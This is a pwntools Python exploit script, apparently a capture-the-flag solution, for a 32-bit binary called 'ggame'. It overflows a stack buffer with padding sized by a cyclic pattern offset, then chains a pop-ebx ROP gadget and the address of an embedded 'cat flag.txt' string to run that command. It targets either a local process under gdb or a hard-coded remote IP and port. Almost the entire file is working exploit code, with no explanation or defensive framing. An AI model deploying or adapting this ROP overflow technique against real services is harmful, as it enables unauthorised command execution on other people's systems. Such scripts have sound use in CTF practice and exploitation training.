#!/usr/bin/env python3

from pwn import *

exe = ELF("ggame")
rop = ROP(exe)
RETURN_ADDR = (rop.find_gadget(['ret']))[0]
POP_EBX_RET = rop.find_gadget(['pop ebx', 'ret'])[0]

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if True:
            gdb.attach(r)
            pause()
    else:
        r = remote("209.38.56.153", 9987)

    return r


def main():
    r = conn()

    
    #cyclicP = cyclic(200)
    #print(cyclicP)
    #r.sendline(cyclicP)
    command_addr = next(exe.search("cat flag.txt")) 
    print(cyclic_find("aaga"))
    command = b"A"*cyclic_find('aaga') + p32(POP_EBX_RET) + p32(command_addr + 0x1fd0) + p32(0x804920f)

    r.sendline(command)
    # 0x080491fa
    r.interactive()


if __name__ == "__main__":
    main()
